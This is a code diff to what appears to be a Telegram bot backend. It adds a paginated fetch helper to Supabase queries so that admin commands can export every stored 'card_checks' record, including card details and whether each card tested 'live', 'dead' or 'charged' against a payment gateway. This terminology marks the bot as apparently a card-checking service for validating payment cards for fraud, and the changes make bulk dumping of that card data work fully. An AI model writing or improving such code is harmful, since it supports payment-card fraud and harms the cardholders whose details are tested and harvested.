@@ -248,6 +248,62 @@ async function sendBroadcastEmail(email: string, username: string | null, broadc
 // UTILITY HELPERS
 // ═══════════════════════════════════════════════════════════
 
+// Fetch all records with pagination to bypass Supabase's 1000 row default limit
+async function fetchAllRecords(
+  supabase: any,
+  table: string,
+  selectFields: string,
+  filters?: { column: string; operator: string; value: any }[],
+  orderBy?: { column: string; ascending: boolean }
+): Promise<any[]> {
+  const PAGE_SIZE = 10000;
+  let allRecords: any[] = [];
+  let from = 0;
+  let hasMore = true;
+
+  while (hasMore) {
+    let query = supabase
+      .from(table)
+      .select(selectFields)
+      .range(from, from + PAGE_SIZE - 1);
+
+    // Apply filters
+    if (filters) {
+      for (const filter of filters) {
+        if (filter.operator === "eq") {
+          query = query.eq(filter.column, filter.value);
+        } else if (filter.operator === "ilike") {
+          query = query.ilike(filter.column, filter.value);
+        } else if (filter.operator === "like") {
+          query = query.like(filter.column, filter.value);
+        }
+      }
+    }
+
+    // Apply ordering
+    if (orderBy) {
+      query = query.order(orderBy.column, { ascending: orderBy.ascending });
+    }
+
+    const { data, error } = await query;
+
+    if (error) {
+      console.error(`Error fetching from ${table}:`, error);
+      break;
+    }
+
+    if (data && data.length > 0) {
+      allRecords = allRecords.concat(data);
+      from += PAGE_SIZE;
+      hasMore = data.length === PAGE_SIZE;
+    } else {
+      hasMore = false;
+    }
+  }
+
+  return allRecords;
+}
+
 // Escape HTML special characters for Telegram HTML parse mode
 function escapeHtml(text: string | null | undefined): string {
   if (!text) return "";
@@ -5376,11 +5432,15 @@ ${gatewayStats || "  No gateway data"}
 
       await sendTelegramMessage(chatId, "⏳ <b>Fetching all cards...</b>\n\nPlease wait while I prepare the file.");
 
-      // Fetch ALL cards with user info (unlimited)
-      const { data: cards, error } = await supabase
-        .from("card_checks")
-        .select("card_details, result, gateway, created_at, user_id")
-        .order("created_at", { ascending: false });
+      // Fetch ALL cards with pagination (unlimited)
+      const cards = await fetchAllRecords(
+        supabase,
+        "card_checks",
+        "card_details, result, gateway, created_at, user_id",
+        undefined,
+        { column: "created_at", ascending: false }
+      );
+      const error = cards.length === 0 ? { message: "No data" } : null;
 
       if (error || !cards || cards.length === 0) {
         await sendTelegramMessage(chatId, "❌ <b>No cards found</b>\n\nThe database has no card check records.");
@@ -5452,11 +5512,15 @@ ${gatewayStats || "  No gateway data"}
 
       await sendTelegramMessage(chatId, "⏳ <b>Fetching live cards...</b>\n\nPlease wait while I prepare the file.");
 
-      const { data: cards, error } = await supabase
-        .from("card_checks")
-        .select("card_details, gateway, created_at, user_id")
-        .eq("result", "live")
-        .order("created_at", { ascending: false });
+      // Fetch ALL live cards with pagination (unlimited)
+      const cards = await fetchAllRecords(
+        supabase,
+        "card_checks",
+        "card_details, gateway, created_at, user_id",
+        [{ column: "result", operator: "eq", value: "live" }],
+        { column: "created_at", ascending: false }
+      );
+      const error = cards.length === 0 ? { message: "No data" } : null;
 
       if (error || !cards || cards.length === 0) {
         await sendTelegramMessage(chatId, "❌ <b>No live cards found</b>\n\nThere are no live card records in the database.");
@@ -5521,11 +5585,15 @@ ${gatewayStats || "  No gateway data"}
 
       await sendTelegramMessage(chatId, "⏳ <b>Fetching dead cards...</b>\n\nPlease wait while I prepare the file.");
 
-      const { data: cards, error } = await supabase
-        .from("card_checks")
-        .select("card_details, gateway, created_at, user_id")
-        .eq("result", "dead")
-        .order("created_at", { ascending: false });
+      // Fetch ALL dead cards with pagination (unlimited)
+      const cards = await fetchAllRecords(
+        supabase,
+        "card_checks",
+        "card_details, gateway, created_at, user_id",
+        [{ column: "result", operator: "eq", value: "dead" }],
+        { column: "created_at", ascending: false }
+      );
+      const error = cards.length === 0 ? { message: "No data" } : null;
 
       if (error || !cards || cards.length === 0) {
         await sendTelegramMessage(chatId, "❌ <b>No dead cards found</b>\n\nThere are no dead card records in the database.");
@@ -5590,11 +5658,15 @@ ${gatewayStats || "  No gateway data"}
 
       await sendTelegramMessage(chatId, "⏳ <b>Fetching charged cards...</b>\n\nPlease wait while I prepare the file.");
 
-      const { data: cards, error } = await supabase
-        .from("card_checks")
-        .select("card_details, gateway, created_at, user_id, result")
-        .ilike("result", "%charged%")
-        .order("created_at", { ascending: false });
+      // Fetch ALL charged cards with pagination (unlimited)
+      const cards = await fetchAllRecords(
+        supabase,
+        "card_checks",
+        "card_details, gateway, created_at, user_id, result",
+        [{ column: "result", operator: "ilike", value: "%charged%" }],
+        { column: "created_at", ascending: false }
+      );
+      const error = cards.length === 0 ? { message: "No data" } : null;
 
       if (error || !cards || cards.length === 0) {
         await sendTelegramMessage(chatId, "❌ <b>No charged cards found</b>\n\nThere are no charged card records in the database.");
